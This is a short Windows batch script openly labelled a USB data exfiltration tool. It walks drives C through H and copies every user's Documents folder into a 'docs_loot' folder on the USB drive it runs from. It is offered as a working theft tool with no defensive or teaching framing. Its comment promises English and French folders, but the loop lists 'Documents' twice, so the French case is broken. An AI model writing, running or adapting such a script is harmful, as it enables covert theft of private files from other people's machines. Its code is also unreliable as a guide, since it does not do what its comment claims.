@echo off
:: USB Data Exfiltration Tool - Documents only (English + French)
:: Copies all Documents folders from target system to USB drive

set usbdrive=%~d0
set targetdir=%usbdrive%\docs_loot

if not exist "%targetdir%" mkdir "%targetdir%"

echo Collecting Documents folders...

for %%u in (C D E F G H) do (
    if exist "%%u:\Users" (
        for /d %%a in ("%%u:\Users\*") do (
            for %%f in (Documents "Documents") do (
                if exist "%%a\%%f" (
                    xcopy "%%a\%%f\*.*" "%targetdir%\%%~na_%%f\" /s /e /c /y
                )
            )
        )
    )
)

echo Finished. All Documents copied to %targetdir%.
exit
